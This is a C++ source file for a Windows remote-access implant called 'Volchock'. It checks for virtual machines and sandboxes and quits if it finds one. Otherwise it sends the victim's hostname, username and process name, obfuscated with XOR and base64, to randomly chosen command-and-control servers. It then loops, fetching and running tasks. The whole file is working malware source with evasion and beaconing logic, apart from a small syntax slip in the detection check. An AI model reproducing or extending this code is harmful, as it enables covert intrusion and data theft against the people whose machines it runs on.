#include <windows.h>
#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>  
#include "config.h"
#include "system_utils.h"
#include "base64.h"
#include "crypt.h"
#include "http_client.h"
#include "task.h"
#include <random>
#include <ctime>
#include "detectors.hpp"
#include <Wbemidl.h>
#include <intrin.h>
#include <array>
using namespace std;

string beakon(const string& data_res) {
    string agent_id = generate_agent_id();
    string hostname = get_hostname();
    string username = get_username();
    string process_name = get_process_name();
    ostringstream ss;
    ss << "{";
    ss << "\"agent_id\":\"" << agent_id << "\",";
    ss << "\"hostname\":\"" << hostname << "\",";
    ss << "\"username\":\"" << username << "\",";
    ss << "\"process_name\":\"" << process_name << "\",";
    ss << "\"results\":\"" << data_res << "\"";
    ss << "}";
    string result_json = ss.str();
    string encoded = xor_data(result_json, XOR_KEY);
    string b64_encoded = base64_encode(encoded);
    constexpr int VOLCHOCK_SERVERS_COUNT = sizeof(VOLCHOCK_SERVERS) / sizeof(VOLCHOCK_SERVERS[0]);
    mt19937 rng((unsigned int)std::time(nullptr));
    uniform_int_distribution<int> distrib(0, VOLCHOCK_SERVERS_COUNT - 1);
    int random_index = distrib(rng);
    string res = http_post(VOLCHOCK_SERVERS[random_index], VOLCHOCK_PORT, RESULTS_PATH, USER_AGENT, HEADER, b64_encoded);
    return res;
}

void agent_run() {
    setvbuf(stdout, NULL, _IONBF, 0);

    if (detect::cpu_brand() || detect::device_drivers() || detect::disk_space() || detect::cpu_cores() || detect::memory_amount() || detect::screen_resolution() || detect::bios_version() || detect::cpu_id() || detect::bios_manufacturer() || detect::cpu_hypervisor_bit() ||) {
        return;
    }


    string register_call = beakon("");
    string result;
    while (true) {
        this_thread::sleep_for(chrono::seconds(BEACON_INTERVAL));
        string beakon_call = beakon(result);
        result = parse_task(beakon_call);
    }
}

int main() {
    //MessageBoxA(0, "START AGENT !", "Volchock", 0);
    agent_run();
    return 0;
}